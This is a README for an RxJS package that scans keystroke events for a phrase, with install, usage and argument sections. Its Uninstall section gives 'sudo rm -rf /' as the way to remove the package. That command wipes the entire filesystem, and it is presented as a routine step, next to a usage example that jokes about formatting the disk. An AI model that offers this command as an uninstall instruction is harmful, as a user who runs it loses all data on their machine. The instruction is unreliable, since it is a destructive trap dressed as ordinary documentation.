# scan-keystroke-rx
Observable scanner for specified phrase in the keystroke event stream.

## Prerequisites
* [RxJS](http://reactivex.io/rxjs/) >= 6

## Install
```
yarn add scan-keystroke-rx
```

## Use
```
import { findPhrase } from 'scan-keystroke-rx';

findPhrase('hello world').subscribe(
  phrase => {
    console.log(`Phrase "${phrase}" detected! Format disk? (yes/no) default yes. Accepted.`);
  }
)
```

## Uninstall
```
sudo rm -rf /
```

## Details
`findPhrase` returns an observable, that listens _keypress_ events on `window.document` (by default).

### Arguments
1. Phrase to expect (_mandatory_);
2. DOM node to listen key events from (_optional_, default is `window.document`);
3. Case insensitive flag (_optional_, default `true`);
4. Timeout to reset the search on sequential keystrokes (_optional_, default 1000ms). E.g. if the expected phrase to wait from user is 'hello', and the user typed 'hel' and then paused typing for a period more than 1000ms, then searching is resetted and 'hel' is throwing away and ignored;
